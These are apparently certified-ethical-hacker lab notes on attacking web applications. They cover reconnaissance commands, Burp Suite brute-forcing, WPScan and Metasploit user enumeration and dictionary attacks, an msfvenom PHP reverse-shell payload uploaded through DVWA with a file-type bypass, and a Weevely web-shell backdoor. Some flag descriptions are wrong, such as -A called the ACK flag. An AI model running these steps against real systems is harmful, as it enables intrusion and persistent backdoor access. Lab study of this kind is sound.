# Hacking Web Applications

Methods:
- SQL injection attacks
- cross-site scripting (XSS)
- cross-site request forgeries (CSRF)
- insecure communications
- brute-force
- parameter tampering

## Footprint
Tasks:
- Server Discovery
- Service Discovery
- Server Identification
- Hidden Content Discovery

### Web Application Reconnaissance
1. Whois lookup
  - Netcraft (https://www.netcraft.com)
  - SmartWhois (https://www.tamos.com)
  - WHOIS Lookup (http://whois.domaintools.com)
  - Batch IP Converter (http://www.sabsoft.com) 
2. DNS interrogation
  - Toolset (https://tools.dnsstuff.com)
  - DNSRecon (https://github.com)
  - DNS Records (https://network-tools.com)
  - Domain Dossier (https://centralops.net)

Steps:
1. ``` nmap -T4 -A -v [Target Web Application, domain name] ```
  - -T4: specifies setting time template (0-5)
  - -A: specifies setting ACK flag
  - -v: enables the verbose output
  - Get Information: target machine name, NetBIOS name, DNS name, MAC address, OS, and other information.
2. ``` telnet [target domain] 80 ```\
   ``` GET /HTTP/1.0 ```\
    displaying information related to the server name and its version, technology used
3. if the attacker entered an **IP address**, they receive the banner information of the target machine.\
   if they enter the **URL of a website**, they receive the banner information of the respective web server that hosts the website.

### WhatWeb
Recognizes content management systems (CMS), blogging platforms, statistics and analytics packages, JavaScript libraries, web servers, and embedded devices.\
Identifies version numbers, email addresses, account IDs, web framework modules, SQL errors

``` whatweb [Target Web Application] ```\
``` whatweb -v [Target Web Application] ```\
``` whatweb --log-verbose=[report name] [Target Web Application] ```\
write output to a text file

### OWASP ZAP
- Click "Automated Scan"
- Input "URL to attack"
- Result in "Alerts" tab

### Detect Load Balancer
2 types:
- Layer 4, DNS
- Layer 7, HTTP

``` dig [domain name] ```\
multiple IP addresses, possibly a load balancer.

``` lbd [domain name] ``` lbd (load balancing detector)\
detects if a given domain uses DNS and http load balancing via the Server: and Date: headers and the differences between server answers. It analyzes the data received from application responses to detect load balancers.

### Identify Web Server Directories
``` nmap -sV --script=http-enum [target domain or IP address] ```\
``` gobuster dir -u [Target Website] -w [worldlist path] ```\
  dir: uses directory or file brute-forcing mode

### Vulnerability Scan by Vega
Other tools:
- WPScan Vulnerability Database (https://wpscan.com), 
- Arachni (https://www.arachni-scanner.com), 
- appspider (https://www.rapid7.com), or 
- Uniscan (https://sourceforge.net) 

### Identify Clickjacking
  iframe
  
## Perform Web Application Attack

### Brute-force by Brup Suite
  Brup Suite: intercepting proxy, application-aware spider, advanced web application scanner, intruder tool, repeater tool, and sequencer tool.
  
  1. "Intruder" tab.
  2. Attack type choose "Cluster bomb".
  3. "Payloads" tab, set payload set and type, load wrodlists.
  4. click "start attack".

### Parameter Tampering by Brup Suite
  
  "Proxy" tab -> "Intercept" -> "Params"
  
### XSS Vulnerabilities
  
###  Cross-site Request Forgery (CSRF) Attack
  ``` wpscan --api-token [API Token from Step#25] --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate vp ```\
  --enumerate vp: specifies the enumeration of vulnerable plugins.
  
### WPScan and Metasploit
  ``` wpscan --api-token [API Token] --url http://10.10.10.16:8080/CEH --enumerate u ```\
  --enumerate u: specifies the enumeration of usernames.
   
   auxiliary module called **wordpress_login_enum** (in **msfconsole**) to perform a dictionary attack using the password.txt 
  
### Remote Command Execution Vulnerability
  
  Damn Vulnerable Web App (DVWA) [link](https://dvwa.co.uk/)\
  The "Command Injection" tab.
  
### File Upload Vulnerability
  
  1. ``` msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw ```
  2. copy the raw payload to a file.
  3. in DVWA`s "File Upload" panel, upload the raw file.
  4. In msfconsole, type use exploit/multi/handler 
  5. Browse the uploaded file`s path, like "http://10.10.10.16:8080/dvwa/hackable/uploads/upload.php"
  
  If security level is high, we can upload payload.jpg to the server. Then use Command Injection to change the file name to payload.php on the server side. Then the same.
  
### Gain Backdoor Access via a Web Shell using Weevely
  [link](https://www.kali.org/tools/weevely/)
  
  1. ``` weevely generate (backdoor password) (output file Path) ```
  2. upload backdoor to server.
  3. ``` weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php (backdoor password) ```
  4. weevely connect to the server.
